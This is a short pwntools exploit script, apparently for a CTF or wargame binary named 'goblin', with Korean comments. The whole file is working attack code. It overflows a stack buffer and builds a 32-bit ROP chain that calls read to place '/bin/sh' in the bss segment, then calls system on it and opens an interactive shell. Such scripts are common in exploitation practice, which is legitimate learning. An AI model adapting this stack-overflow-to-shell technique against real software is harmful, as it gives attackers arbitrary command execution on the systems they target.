from pwn import *

p = process("./goblin")

pop_ret = 0x08049022
pop3_ret = 0x08049391
read_plt = 0x80490b0
system_plt = 0x80490e0
bss = 0x804c030 + 0x300
main = 0x80492f3


payload = b'A'*0x44
payload += b'B'*0x4
# bss영역에 /bin/sh 저장
payload += p32(read_plt)
payload += p32(pop3_ret)
payload += p32(0)
payload += p32(bss)
payload += p32(8)
# system 실행
payload += p32(system_plt)
payload += b'C'*0x4
payload += p32(bss)
p.send(payload)

# /bin/sh 보내기
# sleep(0.1)
p.send(b"/bin/sh\x00")

p.interactive()